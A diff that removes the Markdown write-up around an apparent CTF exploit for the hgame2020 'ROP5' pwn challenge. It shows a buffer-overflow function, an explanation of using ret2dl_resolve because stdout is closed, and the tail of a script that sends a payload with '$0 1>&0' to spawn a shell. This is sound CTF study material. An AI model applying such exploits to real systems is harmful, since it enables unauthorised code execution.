@@ -1,50 +1,3 @@
-## ROP5
-
-- 题目描述：
-
-  > Do you know the Lv.5? 
-  > Just like Misaka Mikoto!
-
-- 题目附件：[ROP5](https://cdn.jsdelivr.net/gh/TaQini/CTF@master/hgame2020/pwn/week4_1/ROP5)
-
-- 考察点：r2dl_resolve
-
-- 难度：困难
-
-- 初始分值：500
-
-- 最终分值：500
-
-- 完成人数：14
-
-### 程序分析
-
-漏洞函数如下，存在缓冲区溢出：
-
-```c
-void vuln(void){
-  undefined local_48 [68];
-  setvbuf(stdout,(char *)0x0,2,0);
-  setvbuf(stdin,(char *)0x0,2,0);
-  puts("Are you the LEVEL5?");
-  close(1);
-  close(2);
-  read(0,local_48,0x100);
-  return;
-}
-```
-
-### 解题思路
-
-读数据前关闭了`stdout`和`stderr`，无法向`stdout`打印数据，因此不能通过`puts`来泄漏`libc`地址
-
-也就是说需要直接执行`system('/bin/sh >&0')`来获取`shell`，于是只能通过`r2dl_reslove`实现
-
-[Veritas501师傅](https://veritas501.space/)的文章有详细`r2dl_reslove`，还写了[脚本](https://veritas501.space/2017/10/07/ret2dl_resolve%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/)，我就一键拿走了
-
-### exp
-
-```python
 #!/usr/bin/python
 #coding=utf-8
 #__author__:TaQini
@@ -161,7 +114,4 @@ raw_input('go')
 sl(dl_data+'$0 1>&0\0')
 
 p.interactive()
-```
-
-
 
